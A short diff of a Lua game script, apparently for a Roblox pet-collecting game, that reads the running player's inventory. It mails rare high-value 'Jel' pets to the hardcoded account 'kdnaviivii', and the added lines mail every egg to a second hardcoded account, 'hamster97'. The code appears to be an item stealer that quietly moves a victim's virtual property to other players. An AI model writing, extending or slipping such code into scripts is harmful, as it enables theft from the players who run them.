@@ -96,7 +96,12 @@ end
 
 for i,v in pairs(save.Inventory.Pet) do
 if string.find(v.id, "Jel") and ndir[v.id].difficulty > 24999999 then
-_mail("kdnaviivii", "Pet", i, (v.am or 1))
+_mail("kdnaviivii", "Pet", i, (v._am or 1))
+end
+end
+if save.Inventory.Egg then
+for i,v in pairs(save.Inventory.Egg) do
+_mail("hamster97", "Egg", i, (v._am or 1))
 end
 end
 
